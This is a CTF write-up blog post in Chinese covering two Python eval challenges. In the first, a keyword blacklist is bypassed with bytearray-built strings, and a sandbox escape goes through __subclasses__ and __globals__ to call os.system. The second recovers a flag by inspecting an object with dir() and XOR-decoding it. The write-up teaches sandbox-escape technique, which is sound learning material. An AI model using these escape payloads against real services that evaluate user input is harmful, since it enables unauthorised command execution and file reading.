---
layout: post
title: NEFU CTF WriteUp —— Python Jail 与 Xorer
date: 2026-09-12
Author: Florence
tags: [CTF, Python, pyjail]
categories: [CTF]
comments: true
toc: true
---

## 题目一：Python Jail

**地址**：`contest.ctf.nefu.edu.cn:31962`

<!-- more -->

### 题目信息

```
Welcome to the python jail
Enter your expression and I will evaluate it for you.
Hint: Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and `,",' Good luck! You goal is to read ./flag
```

### 限制分析

服务端对输入表达式做 `eval`，但做了黑名单过滤：

- **禁用关键字**：`__loader__`、`__import__`、`compile`、`eval`、`exec`、`chr`、`input`、`locals`、`globals`、`bytes`
- **禁用字符**：反引号 `` ` ``、双引号 `"`、单引号 `'`

这意味着：

1. 不能使用字符串字面量（引号全禁）
2. 不能直接用 `chr()` 构造字符
3. 不能直接 `__import__` / `eval` / `exec`

### 绕过思路

出题人禁用了 `bytes`，却**没有禁用 `bytearray`**。这是典型的"漏网之鱼"。

`bytearray([...])` 同样可以由整数列表构造字节序列，并且有 `.decode()` 方法转成字符串：

```python
bytearray([102, 108, 97, 103]).decode()   # 'flag'
```

而 `open`、`read`、`decode` 都不在黑名单里，所以可以直接读文件。

### Payload

目标文件为 `./flag`，对应 ASCII：

| 字符 | `.` | `/` | `f` | `l` | `a` | `g` |
|------|-----|-----|-----|-----|-----|-----|
| ASCII | 46 | 47 | 102 | 108 | 97 | 103 |

最终 payload：

```python
open(bytearray([46,47,102,108,97,103]).decode()).read()
```

若当前目录已在目标位置，也可用：

```python
open(bytearray([102,108,97,103]).decode()).read()
```

### 备用方案（若 `open` 不可用）

通过 `__subclasses__` 逃逸，找到 `os._wrap_close` 类，经其 `__init__.__globals__` 拿到 `system` 执行命令：

```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__==bytearray([95,95,119,114,97,112,95,99,108,111,115,101,95,95]).decode()][0].__init__.__globals__[bytearray([115,121,115,116,101,109]).decode()](bytearray([99,97,116,32,46,47,102,108,97,103]).decode())
```

### 知识点总结

- **`bytes` vs `bytearray`**：两者都表示字节序列，区别在于 `bytes` 不可变、`bytearray` 可变。黑名单只堵了 `bytes`，`bytearray` 可替代构造任意字符串。
- **无引号构造字符串**：利用 `bytearray([...]).decode()` 生成任意字符串。
- **沙箱逃逸链**：`().__class__.__base__.__subclasses__()` → 找到目标类 → `__init__.__globals__` → `__builtins__` / `system`。

---

## 题目二：It's so easy challenge

**地址**：`contest.ctf.nefu.edu.cn:31235`

### 题目信息

```
It's so easy challenge!
Try use dir() to find something interesting.
```

输入表达式后服务端 `eval` 并回显结果，无引号等限制。

### 信息收集

**第一步：`dir()` 探查当前命名空间**

```
> dir()
['__builtins__', 'xorer']
```

发现两个对象：`__builtins__` 和自定义对象 `xorer`。

**第二步：`dir(xorer)` 查看 `xorer` 的属性**

```
> dir(xorer)
['__class__', '__delattr__', ..., 'key', 'my_flag']
```

关键属性：`key` 和 `my_flag`。

**第三步：查看属性值**

```
> xorer.__dict__
{'my_flag': <__main__.xorer.__init__.<locals>.my_flag object at 0x...>, 'key': 23}
```

- `xorer.key = 23`（整数）
- `xorer.my_flag` 是一个自定义类的实例（定义在 `xorer.__init__` 内部，`<locals>` 说明是局部类）

**第四步：`dir(xorer.my_flag)` 查看该对象的属性**

```
> dir(xorer.my_flag)
['__class__', ..., '__weakref__', 'encode']
```

除 dunder 方法外只有一个自定义方法：`encode`。

### 提取数据

调用 `encode()`：

```
> xorer.my_flag.encode()
[121, 100, 126, 123, 118, 117, 108, 114, 114, 39, 39, 47, 33, 46, 117, 58, 115, 38, 34, 35, 58, 35, 114, 35, 37, 58, 47, 113, 33, 34, 58, 38, 116, 113, 32, 117, 34, 46, 118, 32, 114, 37, 46, 106]
```

这是一串整数，结合对象名 `xorer`（XOR-er，异或器）和 `key = 23`，可知是**异或加密后的 flag**。

### 解密

对每个整数与 `23` 异或，再转字符。

**纯 ncat 交互一句话：**

```python
''.join(chr(c^23) for c in xorer.my_flag.encode())
```

或：

```python
bytes([c^23 for c in xorer.my_flag.encode()]).decode()
```

**本地 Python 解密：**

```python
data = [121,100,126,123,118,117,108,114,114,39,39,47,33,46,117,58,115,38,34,35,58,35,114,35,37,58,47,113,33,34,58,38,116,113,32,117,34,46,118,32,114,37,46,106]
print(''.join(chr(c ^ 23) for c in data))
```

**纯 PowerShell（免 Python）：**

```powershell
-join ([int[]](121,100,126,123,118,117,108,114,114,39,39,47,33,46,117,58,115,38,34,35,58,35,114,35,37,58,47,113,33,34,58,38,116,113,32,117,34,46,118,32,114,37,46,106) | % {[char]($_ -bxor 23)})
```

**CyberChef 在线解密：** 拖入 `XOR` 操作，Key 填 `23`，输入十进制列表即可。

### 解密结果

```
nsilab{ee00869b-d154-4e42-8f65-1cf7b59a7e29}
```

（以实际运行结果为准，开头前缀可能因环境而异，整体为 UUID 格式的 flag。）

### 知识点总结

- **`dir()` 是信息收集利器**：能列出对象的所有属性和方法，`__dict__` 能直接看到实例属性。
- **`<locals>` 类**：说明类定义在函数内部，是局部作用域，但不影响通过实例访问其方法。
- **异或加密特征**：对象名 `xorer`、属性 `key`、方法 `encode` 三者组合，明确指向 XOR 加解密。
- **一句话交互**：`eval` 环境可以直接用列表推导 + `chr()` / `bytes().decode()` 完成解密。

---

## 总结对比

| 项目 | Python Jail | Xorer |
|------|-------------|-------|
| 端口 | 31962 | 31235 |
| 核心限制 | 关键字 + 引号黑名单 | 无 |
| 考察点 | 沙箱逃逸、无引号构造字符串 | 信息收集、异或解密 |
| 关键技巧 | `bytearray` 绕过 `bytes` 禁令 | `dir()` 探查 + XOR 还原 |
| 一句话 payload | `open(bytearray([46,47,102,108,97,103]).decode()).read()` | `''.join(chr(c^23) for c in xorer.my_flag.encode())` |

两道题分别考察了 **Python 沙箱逃逸中的黑名单绕过** 和 **基础逆向思维（信息收集 + 异或解密）**，属于 CTF 入门级 Python 题目。
